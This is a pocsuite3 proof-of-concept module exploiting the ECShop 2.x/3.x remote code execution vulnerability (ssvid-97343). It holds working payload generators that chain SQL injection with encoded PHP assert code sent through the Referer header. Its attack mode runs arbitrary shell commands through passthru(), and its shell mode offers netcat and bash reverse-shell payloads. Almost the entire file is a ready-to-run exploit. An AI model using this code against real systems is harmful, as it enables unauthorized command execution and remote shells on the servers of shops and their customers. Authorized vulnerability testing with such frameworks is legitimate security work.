"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

import base64
import binascii
from collections import OrderedDict
from urllib.parse import urljoin

from requests.exceptions import ReadTimeout

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, \
    OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text


class DemoPOC(POCBase):
    vulID = '97343'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'Ecshop 2.x/3.x Remote Code Execution'
    appPowerLink = ''
    appName = 'ECSHOP'
    appVersion = '2.x,3.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''近日，Ecshop爆出全版本SQL注入及任意代码执行漏洞，受影响的版本有：Ecshop 2.x,Ecshop 3.x-3.6.0'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    pocDesc = '''在攻击模式下，可以通过command参数来指定任意命令,app_version用于选定ecshop版本'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        o["app_version"] = OptItems(['2.x', '3.x', 'Auto'], selected="Auto", description='目标版本，可自动匹配')
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def gen_ec2payload(self, phpcode):
        # ECShop 2.x payload
        encoded_code = base64.b64encode(phpcode.encode())

        payload = """{$asd'];assert(base64_decode('%s'));//}xxx""" % (
            encoded_code.decode())
        payload = binascii.hexlify(payload.encode()).decode()
        payload = '*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x{},10-- -'.format(payload)
        payload = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:%s:"%s";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca''' % (
            len(payload), payload)
        return payload

    def gen_ec3payload(self, phpcode):
        # ECShop 3.x payload
        encoded_code = base64.b64encode(phpcode.encode())

        payload = "{$asd'];assert(base64_decode('%s'));//}xxx" % (
            encoded_code.decode())

        payload = binascii.hexlify(payload.encode()).decode()
        payload = '*/ select 1,0x2720756e696f6e202f2a,3,4,5,6,7,8,0x{},10-- -'.format(payload)
        payload = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{{s:3:"num";s:{}:"{}";s:2:"id";s:10:"\' union /*";}}'.format(
            len(payload), payload)
        return payload

    def _verify(self):
        result = {}
        url = urljoin(self.url, '/user.php?act=login')
        phpcode = "phpinfo()"
        flagText = "allow_url_include"

        # ECShop 2.x payload
        ec2payload = self.gen_ec2payload(phpcode)
        # ECShop 3.x payload
        ec3payload = self.gen_ec3payload(phpcode)

        option = self.get_option("app_version")

        if option == "Auto":
            payloads = [(ec2payload, '2.x'), (ec3payload, '3.x')]
        elif option == "2.x":
            payloads = [(ec2payload, '2.x')]
        elif option == '3.x':
            payloads = [(ec3payload, '3.x')]

        for payload, version in payloads:
            headers = {'Referer': payload}
            try:
                rr = requests.get(url, headers=headers)
                if flagText in rr.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Version'] = version
                    break
            except ReadTimeout:
                break
            except Exception as e:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._exploit(cmd)

        return self.parse_output(result)

    def _shell(self):
        cmd = self.get_option("payload")
        self._exploit(cmd)

    def _exploit(self, cmd='whoami'):
        url = urljoin(self.url, '/user.php?act=login')

        phpcode = 'passthru("{0}");'.format(cmd)

        # ECShop 2.x payload
        ec2payload = self.gen_ec2payload(phpcode)
        # ECShop 3.x payload

        ec3payload = self.gen_ec3payload(phpcode)
        option = self.get_option("app_version")
        if option == "Auto":
            payloads = [(ec2payload, '2.x'), (ec3payload, '3.x')]
        elif option == "2.x":
            payloads = [(ec2payload, '2.x')]
        elif option == '3.x':
            payloads = [(ec3payload, '3.x')]
        # payloads = [ec2payload, ec3payload]

        for payload in payloads:
            headers = {'Referer': payload[0]}
            resp = requests.get(url, headers=headers)
            r = get_middle_text(resp.text, '''<input type="hidden" name="back_act" value="''', "\n<br />")
            if r:
                return r
            r = get_middle_text(resp.text, '''<input type="hidden" name="back_act" value="''', 'xxx')
            if r:
                return r


register_poc(DemoPOC)
